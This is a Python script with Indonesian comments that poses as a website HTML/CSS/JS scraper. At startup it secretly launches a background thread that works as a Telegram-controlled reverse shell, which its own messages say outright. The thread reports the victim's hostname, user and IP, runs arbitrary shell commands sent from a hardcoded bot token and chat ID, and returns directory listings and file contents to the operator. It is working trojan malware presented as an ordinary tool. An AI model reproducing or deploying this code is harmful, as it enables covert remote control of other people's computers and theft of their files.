# Import library yang dibutuhkan
import requests           # Untuk komunikasi dengan API Telegram dan download web
import subprocess         # Untuk menjalankan perintah shell
import time               # Untuk delay antar polling
import platform           # Untuk ambil info OS
import socket             # Untuk ambil hostname & IP
import os                 # Untuk operasi file & direktori
import threading          # Untuk menjalankan dua proses secara paralel
from bs4 import BeautifulSoup  # Untuk parsing HTML
from urllib.parse import urljoin, urlparse  # Untuk menangani URL dengan benar

# Token dan chat ID dari bot Telegram (ganti dengan milik Anda jika dipakai secara sah)
BOT_TOKEN = "7138157401:AAF9G6HmVk6iiTweXrBm1AS1jqZ7pdyLoDg"
CHAT_ID = "7822932083"

# Variabel untuk menyimpan ID update terakhir (untuk polling Telegram)
last_update_id = None

# Fungsi untuk mengirim pesan ke Telegram
def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

# Fungsi untuk mengambil update baru dari bot Telegram
def get_updates():
    global last_update_id
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    if last_update_id:
        url += f"?offset={last_update_id + 1}"
    try:
        res = requests.get(url)
        return res.json()
    except:
        return {"result": []}

# Fungsi untuk menjalankan perintah shell dan mengembalikan output-nya
def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"[!] Error: {e.output.decode()}"
    except Exception as e:
        return f"[!] Exception: {str(e)}"

# Fungsi untuk menampilkan info sistem
def system_info():
    try:
        info = (
            f"📄 *Info Sistem:*\n"
            f"Hostname : {socket.gethostname()}\n"
            f"OS       : {platform.system()} {platform.release()}\n"
            f"Path     : {os.getcwd()}\n"
            f"User     : {os.getlogin()}\n"
            f"IP       : {socket.gethostbyname(socket.gethostname())}"
        )
        return info
    except Exception as e:
        return f"[!] Gagal ambil info sistem: {str(e)}"

# Fungsi untuk menampilkan bantuan perintah
def show_help():
    return (
        "📌 *Perintah Tersedia:*\n"
        "/help       – Menampilkan bantuan\n"
        "/info       – Info sistem korban\n"
        "/shell [cmd]– Jalankan perintah shell\n"
        "/cd [path]  – Pindah direktori\n"
        "/ls         – Lihat isi folder\n"
        "/cwd        – Cek direktori saat ini\n"
        "/cat [file] – Lihat isi file (max 4000 char)"
    )

# Fungsi utama untuk menangani bot Telegram
def handle_telegram():
    global last_update_id
    send_message("✅ Reverse Shell via Telegram AKTIF!\nKetik /help untuk mulai.")

    while True:
        try:
            updates = get_updates()
            for result in updates["result"]:
                last_update_id = result["update_id"]
                message = result.get("message", {})
                text = message.get("text", "")

                # Jika tidak ada teks, lanjut
                if not text:
                    continue

                # Abaikan jika bukan dari CHAT_ID yang sah
                if str(message.get("chat", {}).get("id")) != CHAT_ID:
                    continue

                # Perintah /help
                if text.startswith("/help"):
                    send_message(show_help())

                # Perintah /info
                elif text.startswith("/info"):
                    send_message(system_info())

                # Perintah /cwd
                elif text.startswith("/cwd"):
                    send_message(f"📂 Current dir: {os.getcwd()}")

                # Perintah /ls
                elif text.startswith("/ls"):
                    try:
                        files = os.listdir()
                        send_message("📁 File:\n" + "\n".join(files))
                    except Exception as e:
                        send_message(str(e))

                # Perintah /cd
                elif text.startswith("/cd "):
                    path = text[4:].strip()
                    try:
                        os.chdir(path)
                        send_message(f"✅ Pindah ke: {os.getcwd()}")
                    except Exception as e:
                        send_message(f"[!] Gagal cd: {str(e)}")

                # Perintah /shell
                elif text.startswith("/shell "):
                    cmd = text.split(" ", 1)[1]
                    send_message(f"🖥 Menjalankan: `{cmd}`")
                    output = execute_command(cmd)
                    # Potong output jika panjang
                    for i in range(0, len(output), 4000):
                        send_message(output[i:i+4000])

                # Perintah /cat [filename]
                elif text.startswith("/cat "):
                    filename = text[5:].strip()
                    try:
                        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            if len(content) > 4000:
                                send_message(f"📄 Isi dari {filename}:\n{content[:4000]}...\n[potong]")
                            else:
                                send_message(f"📄 Isi dari {filename}:\n{content}")
                    except Exception as e:
                        send_message(f"[!] Gagal baca file: {str(e)}")

                # Default: Jalankan sebagai perintah shell
                else:
                    send_message(f"📟 Menjalankan (auto): `{text}`")
                    output = execute_command(text)
                    for i in range(0, len(output), 4000):
                        send_message(output[i:i+4000])

        except Exception as e:
            send_message(f"[!] Error utama: {str(e)}")

        # Delay polling biar nggak overload
        time.sleep(2)

# Fitur tambahan: Web Dumper (tidak terkait langsung dengan Telegram)
def dump_website(url):
    folder = "dump"
    os.makedirs(folder, exist_ok=True)

    try:
        res = requests.get(url, timeout=10)
        html = res.text
        domain = urlparse(url).netloc.replace(".", "_")
        base_path = os.path.join(folder, domain)
        os.makedirs(base_path, exist_ok=True)

        html_file = os.path.join(base_path, "index.html")
        with open(html_file, "w", encoding="utf-8") as f:
            f.write(html)

        soup = BeautifulSoup(html, "html.parser")
        resources = []

        for tag in soup.find_all(["link", "script"]):
            src = tag.get("href") or tag.get("src")
            if src and src.startswith(("http", "/")):
                full_url = urljoin(url, src)
                resources.append(full_url)

        for link in resources:
            try:
                filename = os.path.basename(link).split("?")[0]
                save_path = os.path.join(base_path, filename)
                r = requests.get(link, timeout=5)
                with open(save_path, "wb") as f:
                    f.write(r.content)
                print(f"✅ Downloaded: {filename}")
            except Exception as e:
                print(f"⚠️ Gagal ambil: {link}")

        print(f"\n🌐 Website disimpan di: {base_path}")
        return base_path
    except Exception as e:
        print(f"[!] Error dump: {str(e)}")
        return None

# Mode terminal lokal untuk mendownload dan melihat file HTML
def handle_terminal():
    print("🌐 Scraping Html Css Js")
    print("Ketik URL (https://...) untuk mulai download HTML/CSS/JS")
    print("""
    01 -- LIST
    02 -- BACK
    03 -- EXIT
    """)

    while True:
        try:
            url = input("Masukkan URL: ").strip()
            if url.lower() == "exit":
                print("Keluar...")
                break
            if not url.startswith("http"):
                print("⚠️ URL harus diawali http atau https")
                continue

            folder_path = dump_website(url)
            if not folder_path:
                continue

            while True:
                print("\n📁 File tersedia:")
                files = os.listdir(folder_path)
                for idx, fname in enumerate(files):
                    print(f"{idx+1}. {fname}")

                print("Ketik nomor file untuk print, atau `back`, `list`, `exit`")
                cmd = input("pilih> ").strip().lower()

                if cmd == "01":
                    break
                elif cmd == "02":
                    continue
                elif cmd == "03":
                    return
                elif cmd.isdigit():
                    idx = int(cmd) - 1
                    if 0 <= idx < len(files):
                        target_file = os.path.join(folder_path, files[idx])
                        try:
                            with open(target_file, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                print(f"\n📄 Isi dari {files[idx]}:\n{'='*60}")
                                print(content[:5000] + ("\n... [potong]" if len(content) > 5000 else ""))
                        except Exception as e:
                            print(f"[!] Gagal baca file: {e}")
                    else:
                        print("❌ Nomor tidak valid.")
                else:
                    print("❓ Perintah tidak dikenal.")

        except Exception as e:
            print(f"[!] Error: {str(e)}")

# Jalankan dua thread: Telegram & Terminal lokal
telegram_thread = threading.Thread(target=handle_telegram)
telegram_thread.daemon = True
telegram_thread.start()

handle_terminal()
